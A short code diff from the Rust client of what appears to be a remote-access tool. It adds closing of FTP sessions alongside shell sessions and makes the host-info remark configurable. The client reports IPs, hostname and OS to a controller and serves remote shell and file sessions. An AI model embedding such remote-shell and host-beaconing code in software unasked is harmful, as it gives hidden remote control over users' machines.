@@ -54,6 +54,7 @@ fn main() {
 
     loop{
         close_all_session_in_lock!(shell_session_mgr);
+        close_all_session_in_lock!(ftp_session_mgr);
 
         let (session_sender , session_receiver) = channel::<SessionBase>();
 
@@ -102,7 +103,7 @@ fn main() {
             ip: ips,
             host_name: hostname,
             os: os,
-            remark: "test remark".to_string()
+            remark: config.remark.clone()
         };
 
         let mut buf = match Message::build(HeroinnClientMsgID::HostInfo.to_u8(), &clientid, hostinfo){
